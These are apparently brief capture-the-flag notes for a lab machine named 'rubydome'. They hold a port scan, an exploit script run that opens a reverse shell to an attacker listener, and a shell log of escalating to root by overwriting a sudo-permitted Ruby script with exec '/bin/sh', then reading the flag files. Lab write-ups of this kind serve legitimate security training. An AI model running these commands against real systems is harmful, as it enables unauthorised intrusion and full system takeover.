参考资料：
 
rustscan -a 192.168.119.22 -u 5000 -t 8000 --scripts -- -n -Pn -sVC
 
python3 51293.py -s 192.168.45.215 9001 -w [http://192.168.166.22:3000/pdf](http://192.168.166.22:3000/pdf) -p url
   

andrew@rubydome:~/app$ cd  
cd  
andrew@rubydome:~$ ls  
ls  
app local.txt  
andrew@rubydome:~$ cat local.txt  
cat local.txt  
874d28582467056bbcbb6f5343f1bff9  
andrew@rubydome:~$ sudo -l  
sudo -l  
Matching Defaults entries for andrew on rubydome:  
env_reset, mail_badpass,  
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,  
use_pty
 
User andrew may run the following commands on rubydome:  
(ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb  
andrew@rubydome:~$ cd -  
cd -  
/home/andrew/app  
andrew@rubydome:~/app$ ls  
ls  
app.rb page.pdf  
andrew@rubydome:~/app$ mv app.rb app_1.rb  
mv app.rb app_1.rb  
andrew@rubydome:~/app$ echo 'exec "/bin/sh"' \> app.rb  
echo 'exec "/bin/sh"' \> app.rb  
andrew@rubydome:~/app$ cat app.rb  
cat app.rb  
exec "/bin/sh"  
andrew@rubydome:~/app$ sudo /usr/bin/ruby /home/andrew/app/app.rb  
sudo /usr/bin/ruby /home/andrew/app/app.rb  
# cd /root  
cd /root  
# ls  
ls  
email1.txt proof.txt snap  
# cat proof.txt  
cat proof.txt  
3d069de93e89b32ad8c2b7ccfc593d86  
#